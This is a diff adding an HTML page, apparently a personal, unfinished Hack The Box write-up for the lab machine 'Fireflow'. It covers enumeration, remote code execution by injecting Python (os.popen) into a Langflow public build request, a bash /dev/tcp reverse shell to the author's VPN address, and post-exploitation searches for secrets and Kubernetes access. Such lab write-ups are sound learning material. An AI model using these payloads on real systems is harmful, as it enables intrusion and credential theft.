@@ -1,1 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Fireflow - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
 
+  <body>
+    <header>
+      <h1>Fireflow</h1>
+      <p>Hack The Box Machine Report</p>
+    </header>
+
+    <main class="report">
+
+      <h2>Machine Info</h2>
+      <p><strong>Difficulty:</strong> In Progress</p>
+      <p><strong>Operating System:</strong> Linux</p>
+      <p><strong>Status:</strong> In Progress</p>
+      <p><strong>Date Started:</strong> 26 June 2026</p>
+      <p><strong>Date Completed:</strong> In Progress</p>
+
+      <h2>Summary</h2>
+      <p>
+        Fireflow is a Linux machine hosting an HTTPS web application for Task Force Nightfall.
+        Initial enumeration revealed an nginx web server with a wildcard TLS certificate for
+        <code>fireflow.htb</code> and <code>*.fireflow.htb</code>. The main site exposed a link to
+        a Langflow playground on the subdomain <code>flow.fireflow.htb</code>.
+      </p>
+
+      <p>
+        The attack path began with web enumeration and traffic inspection in the browser. The
+        Langflow playground was found to use a public flow endpoint under
+        <code>/api/v1/build_public_tmp/</code>. By copying and modifying the request payload, I was
+        able to replace the Python code inside the <code>TextOperations</code> component and obtain
+        remote code execution as <code>www-data</code>. This was then converted into a reverse shell.
+      </p>
+
+      <p>
+        Post-exploitation enumeration revealed Langflow application data in
+        <code>/var/lib/langflow</code>, including <code>langflow.db</code>, a <code>secret_key</code> file,
+        and an MCP server configuration. Local service enumeration also showed Kubernetes-related
+        services listening on localhost, including the Kubernetes API server on port
+        <code>6443</code> and kubelet-related ports.
+      </p>
+
+      <h2>Reconnaissance</h2>
+
+      <h3>Basic Nmap Scan</h3>
+      <pre><code>nmap 10.129.22.117 -oA Nmap/initial</code></pre>
+
+      <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-26 19:47 PDT
+Nmap scan report for 10.129.22.117
+Host is up (0.087s latency).
+Not shown: 992 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+443/tcp   open     https
+9100/tcp  filtered jetdirect
+30000/tcp filtered ndmps
+30718/tcp filtered unknown
+30951/tcp filtered unknown
+31038/tcp filtered unknown
+31337/tcp filtered Elite</code></pre>
+
+      <h3>Full Nmap Scan</h3>
+      <pre><code>nmap -sC -sV -p 22,443,9100,30000,30718,30951,31038,31337 10.129.22.117 -oA Nmap/full</code></pre>
+
+      <pre><code>PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+443/tcp   open     ssl/http  nginx
+|_http-title: Did not follow redirect to https://fireflow.htb/
+| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
+| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
+| Not valid before: 2026-04-14T16:35:31
+|_Not valid after:  2028-07-17T16:35:31
+9100/tcp  filtered jetdirect
+30000/tcp filtered ndmps
+30718/tcp filtered unknown
+30951/tcp filtered unknown
+31038/tcp filtered unknown
+31337/tcp filtered Elite</code></pre>
+
+      <h3>Open Ports</h3>
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>22</td>
+            <td>SSH</td>
+            <td>OpenSSH 9.6p1 on Ubuntu. Password authentication was enabled but no valid credentials were available.</td>
+          </tr>
+          <tr>
+            <td>443</td>
+            <td>HTTPS</td>
+            <td>nginx web server using a self-signed certificate for <code>fireflow.htb</code> and <code>*.fireflow.htb</code>.</td>
+          </tr>
+          <tr>
+            <td>9100</td>
+            <td>Filtered</td>
+            <td>Likely metrics-related service based on later local enumeration.</td>
+          </tr>
+          <tr>
+            <td>30000, 30718, 30951, 31038, 31337</td>
+            <td>Filtered</td>
+            <td>Filtered high ports. Later local enumeration suggested Kubernetes-related services are present on the host.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>Service Enumeration</h2>
+
+      <h3>SSH</h3>
+      <p>
+        SSH was reachable on port 22, but no valid credentials were available during initial enumeration.
+      </p>
+
+      <pre><code>ssh 10.129.22.117</code></pre>
+
+      <pre><code>netswipe@10.129.22.117's password:
+Permission denied, please try again.
+netswipe@10.129.22.117: Permission denied (publickey,password).</code></pre>
+
+      <h3>HTTPS Hostname Setup</h3>
+      <p>
+        The TLS certificate and web redirect indicated that the hostname <code>fireflow.htb</code>
+        should be added to <code>/etc/hosts</code>.
+      </p>
+
+      <pre><code>echo "10.129.22.117 fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
+
+      <h3>Self-Signed Certificate</h3>
+      <p>
+        Curl initially failed because the site used a self-signed certificate. I learned to use
+        <code>-k</code> with curl to ignore certificate validation in this HTB lab context.
+      </p>
+
+      <pre><code>curl -k -I https://fireflow.htb</code></pre>
+
+      <pre><code>HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html
+Content-Length: 12913
+X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin</code></pre>
+
+      <h3>Directory Enumeration Issue</h3>
+      <p>
+        Initial Gobuster enumeration failed because TLS certificate validation was not disabled.
+        This was another reminder to use <code>-k</code> when testing self-signed HTTPS services.
+      </p>
+
+      <pre><code>gobuster dir -u https://fireflow.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+
+      <pre><code>Error: error on running gobuster: unable to connect to https://fireflow.htb/:
+tls: failed to verify certificate: x509: certificate signed by unknown authority</code></pre>
+
+      <h2>Web Enumeration</h2>
+
+      <h3>Main Page Findings</h3>
+      <p>
+        Reviewing the main page source revealed several useful clues:
+      </p>
+
+      <ul>
+        <li><code>flow.fireflow.htb</code> subdomain</li>
+        <li><code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code> Langflow playground path</li>
+        <li><code>ops@fireflow.htb</code> email address</li>
+        <li>Flow engine version <code>1.8.2</code></li>
+        <li>MCP Tool Registry reference</li>
+      </ul>
+
+      <h3>WhatWeb</h3>
+      <pre><code>whatweb https://fireflow.htb</code></pre>
+
+      <pre><code>https://fireflow.htb [200 OK] Email[ops@fireflow.htb], HTML5,
+HTTPServer[nginx], IP[10.129.22.117], Title[FireFlow — Task Force Nightfall],
+X-Frame-Options[ALLOW-FROM https://flow.fireflow.htb], nginx</code></pre>
+
+      <h3>Subdomain Setup</h3>
+      <p>
+        The wildcard certificate and page source both pointed to <code>flow.fireflow.htb</code>.
+      </p>
+
+      <pre><code>echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
+
+      <h3>Langflow Playground</h3>
+      <p>
+        Visiting the playground URL revealed a Langflow AI chat interface.
+      </p>
+
+      <pre><code>https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
+
+      <pre><code>curl -k -I https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
+
+      <pre><code>HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html; charset=utf-8
+Content-Length: 1142
+Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;</code></pre>
+
+      <pre><code>whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
+
+      <pre><code>https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 [200 OK]
+HTML5, HTTPServer[nginx], Script[module], Title[Langflow], nginx</code></pre>
+
+      <h2>Langflow Request Analysis</h2>
+
+      <h3>Browser Network Inspection</h3>
+      <p>
+        In the browser developer tools, the Langflow playground generated a POST request to the
+        public temporary build endpoint. The important endpoint was:
+      </p>
+
+      <pre><code>/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?start_component_id=ChatInput-608En&amp;log_builds=false&amp;event_delivery=streaming</code></pre>
+
+      <p>
+        The response returned a <code>job_id</code>, which could then be used with the corresponding
+        <code>/events</code> endpoint to retrieve the flow output.
+      </p>
+
+      <pre><code>POST /api/v1/build_public_tmp/&lt;flow_id&gt;/flow  → returns job_id
+GET  /api/v1/build_public_tmp/&lt;job_id&gt;/events → returns output/events</code></pre>
+
+      <h3>Flow Structure</h3>
+      <p>
+        The copied request payload showed the Langflow graph structure:
+      </p>
+
+      <pre><code>ChatInput-608En → TextOperations-yvwhG → ChatOutput-gfxpD</code></pre>
+
+      <p>
+        The <code>TextOperations-yvwhG</code> node was responsible for replacing all user input with
+        a canned response. Its configuration used a regex search pattern that matched everything.
+      </p>
+
+      <pre><code>operation: Text Replace
+search_pattern: ^.*$
+use_regex: true
+replacement_text: We are extremely sorry, this is still under development. Please, check back soon...</code></pre>
+
+      <h2>Initial Access</h2>
+
+      <h3>Manual Payload Modification</h3>
+      <p>
+        The request payload contained the Python code for the <code>TextOperations</code> component.
+        By modifying the <code>get_message()</code> method inside the component code, I was able to
+        make the server execute a system command and return the output in the Langflow response.
+      </p>
+
+      <p>The original method looked like this:</p>
+
+      <pre><code>def get_message(self) -&gt; Message:
+    """Return result as simple message with the processed text."""
+    result = self.process_text()
+    return Message(text=self._format_result_as_text(result))</code></pre>
+
+      <p>The modified proof-of-execution method used <code>os.popen()</code>:</p>
+
+      <pre><code>def get_message(self) -&gt; Message:
+    import os
+    return Message(text=os.popen("id").read())</code></pre>
+
+      <h3>Proof of Remote Code Execution</h3>
+      <p>
+        After posting the modified flow payload and fetching the job events, the server returned
+        command output showing that code execution was achieved as <code>www-data</code>.
+      </p>
+
+      <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+      <p>
+        Additional command execution confirmed the hostname and working directory:
+      </p>
+
+      <pre><code>whoami; hostname; pwd</code></pre>
+
+      <pre><code>www-data
+fireflow
+/var/lib/langflow</code></pre>
+
+      <h3>Automation Script</h3>
+      <p>
+        To make command execution easier, I created a helper script named <code>runflow.py</code>.
+        The script updates <code>flow.json</code>, replaces the command inside the
+        <code>get_message()</code> method, posts the modified flow, and prints the job ID for manual
+        event fetching.
+      </p>
+
+      <pre><code>./runflow.py 'id'
+./runflow.py 'whoami; hostname; pwd'</code></pre>
+
+      <p>
+        The key lesson was that the <code>flow_id</code> remains stable, but each POST creates a new
+        <code>job_id</code>.
+      </p>
+
+      <pre><code>Flow ID = which flow to run
+Job ID  = this specific run's result</code></pre>
+
+      <h3>Reverse Shell</h3>
+      <p>
+        After proving command execution, I used the same payload location to trigger a Bash reverse
+        shell back to my VPN IP address.
+      </p>
+
+      <p>Listener:</p>
+      <pre><code>nc -lvnp 4444</code></pre>
+
+      <p>Payload:</p>
+      <pre><code>./runflow.py 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.209/4444 0&gt;&amp;1"'</code></pre>
+
+      <p>The listener received a shell:</p>
+
+      <pre><code>Connection received on 10.129.22.117 52696
+bash: cannot set terminal process group (1530): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@fireflow:/var/lib/langflow$</code></pre>
+
+      <h2>Post-Exploitation Enumeration</h2>
+
+      <h3>Current User</h3>
+      <pre><code>whoami
+hostname
+pwd</code></pre>
+
+      <pre><code>www-data
+fireflow
+/var/lib/langflow</code></pre>
+
+      <h3>Home Directory</h3>
+      <p>
+        The <code>/home</code> directory contained a user named <code>nightfall</code>, but
+        <code>www-data</code> did not have permission to enter the directory.
+      </p>
+
+      <pre><code>cd /home
+ls
+cd nightfall</code></pre>
+
+      <pre><code>nightfall
+bash: cd: nightfall: Permission denied</code></pre>
+
+      <h3>Langflow Application Data</h3>
+      <p>
+        The Langflow working directory contained several interesting files and directories.
+      </p>
+
+      <pre><code>ls /var/lib/langflow</code></pre>
+
+      <pre><code>ba4fe756-d6f7-4c7a-a7b1-f986206878ec
+langflow.db
+profile_pictures
+secret_key</code></pre>
+
+      <p>
+        The <code>secret_key</code> file contained a Langflow secret value. The value was recorded
+        locally but should be redacted in public notes.
+      </p>
+
+      <pre><code>cat /var/lib/langflow/secret_key
+REDACTED</code></pre>
+
+      <h3>MCP Server Configuration</h3>
+      <p>
+        Searching the Langflow directory revealed an MCP server configuration file pointing to a
+        local Langflow MCP endpoint.
+      </p>
+
+      <pre><code>grep -RniE 'nightfall|password|passwd|secret|token|api|key|ssh|credential' /var/lib/langflow 2&gt;/dev/null | head -100</code></pre>
+
+      <pre><code>/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec/_mcp_servers_ba4fe756-d6f7-4c7a-a7b1-f986206878ec.json:1:
+{"mcpServers":{"lf-starter_project":{"command":"uvx","args":["mcp-proxy","--transport","streamablehttp","http://127.0.0.1:7860/api/v1/mcp/project/62e121b7-b863-48a5-a69d-d5b48a0afa84/streamable"]}}}</code></pre>
+
+      <p>
+        Querying the endpoint showed that it existed but required an API key.
+      </p>
+
+      <pre><code>curl -s http://127.0.0.1:7860/api/v1/mcp/project/62e121b7-b863-48a5-a69d-d5b48a0afa84/streamable</code></pre>
+
+      <pre><code>{"detail":"API key required for this project. Provide x-api-key header or query parameter."}</code></pre>
+
+      <h3>Local Service Enumeration</h3>
+      <p>
+        Running <code>ss</code> revealed multiple local services, including Langflow and Kubernetes
+        components.
+      </p>
+
+      <pre><code>ss -tulpen</code></pre>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Address</th>
+            <th>Port</th>
+            <th>Likely Service</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>127.0.0.1</td>
+            <td>7860</td>
+            <td>Langflow</td>
+            <td>Python process hosting local Langflow API.</td>
+          </tr>
+          <tr>
+            <td>0.0.0.0</td>
+            <td>443</td>
+            <td>nginx</td>
+            <td>Public HTTPS reverse proxy.</td>
+          </tr>
+          <tr>
+            <td>0.0.0.0 / ::</td>
+            <td>22</td>
+            <td>SSH</td>
+            <td>Remote login service.</td>
+          </tr>
+          <tr>
+            <td>*</td>
+            <td>6443</td>
+            <td>Kubernetes API Server</td>
+            <td>Returned 401 Unauthorized without credentials.</td>
+          </tr>
+          <tr>
+            <td>*</td>
+            <td>10250</td>
+            <td>Kubelet</td>
+            <td>Returned Unauthorized.</td>
+          </tr>
+          <tr>
+            <td>127.0.0.1</td>
+            <td>10248</td>
+            <td>Kubelet Health</td>
+            <td>Returned <code>ok</code>.</td>
+          </tr>
+          <tr>
+            <td>127.0.0.1</td>
+            <td>10256</td>
+            <td>Kube Proxy Health</td>
+            <td>Returned healthy status JSON.</td>
+          </tr>
+          <tr>
+            <td>*</td>
+            <td>9100</td>
+            <td>Metrics</td>
+            <td>Likely node exporter or metrics endpoint.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>Kubernetes Checks</h3>
+      <p>
+        The Kubernetes API server and kubelet were reachable locally but required authentication.
+      </p>
+
+      <pre><code>curl -k -s https://127.0.0.1:6443/version</code></pre>
+
+      <pre><code>{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "Unauthorized",
+  "reason": "Unauthorized",
+  "code": 401
+}</code></pre>
+
+      <pre><code>curl -k -s https://127.0.0.1:10250/pods</code></pre>
+
+      <pre><code>Unauthorized</code></pre>
+
+      <p>
+        Health endpoints were accessible:
+      </p>
+
+      <pre><code>curl -s http://127.0.0.1:10248/healthz
+ok</code></pre>
+
+      <pre><code>curl -s http://127.0.0.1:10256/healthz</code></pre>
+
+      <pre><code>{"nodeEligible":true,"healthy":true}</code></pre>
+
+      <p>
+        The default Kubernetes service account path did not appear to contain a mounted token for
+        the current process.
+      </p>
+
+      <pre><code>ls -la /var/run/secrets/kubernetes.io/serviceaccount 2&gt;/dev/null</code></pre>
+
+      <pre><code>No output</code></pre>
+
+      <h2>Current Status</h2>
+      <p>
+        Initial access has been achieved as <code>www-data</code>. The next goal is to find a path to
+        the <code>nightfall</code> user or a Kubernetes/Langflow credential that allows further access.
+      </p>
+
+      <h2>Next Steps</h2>
+      <ul>
+        <li>Run and review LinPEAS output from the <code>www-data</code> shell.</li>
+        <li>Search for API keys that can access the local Langflow MCP endpoint.</li>
+        <li>Investigate <code>langflow.db</code> and any other database files.</li>
+        <li>Look for kubeconfigs, Kubernetes service account tokens, or readable certificates.</li>
+        <li>Check for SUID binaries, writable services, cron jobs, and interesting capabilities.</li>
+        <li>Find a way to access the <code>nightfall</code> user account and retrieve <code>user.txt</code>.</li>
+      </ul>
+
+      <h2>Tools Used</h2>
+      <ul>
+        <li>Nmap</li>
+        <li>curl</li>
+        <li>Gobuster</li>
+        <li>WhatWeb</li>
+        <li>Browser Developer Tools</li>
+        <li>Python</li>
+        <li>Netcat</li>
+        <li>SQLite3</li>
+        <li>ss</li>
+        <li>LinPEAS</li>
+      </ul>
+
+      <h2>Lessons Learned</h2>
+      <p>
+        This machine reinforced the importance of inspecting browser network traffic when a web
+        application hides important behavior behind a frontend. Directory brute forcing alone was
+        not enough; the key discovery came from the POST request generated by the Langflow
+        playground.
+      </p>
+
+      <p>
+        I also learned the difference between a stable <code>flow_id</code> and a per-run
+        <code>job_id</code>. The <code>flow_id</code> identifies the Langflow graph to run, while the
+        <code>job_id</code> identifies one specific execution and is used to fetch output from the
+        <code>/events</code> endpoint.
+      </p>
+
+      <p>
+        Finally, the foothold showed how application-level RCE can lead into broader host and
+        cluster enumeration. After gaining a shell as <code>www-data</code>, local services revealed
+        Kubernetes components and internal Langflow/MCP functionality that were not directly
+        accessible from the outside.
+      </p>
+
+      <h2>Flags</h2>
+      <pre><code>user.txt: Not yet obtained
+root.txt: Not yet obtained</code></pre>
+
+      <p><a href="../index.html">Back to all reports</a></p>
+
+    </main>
+  </body>
+</html>
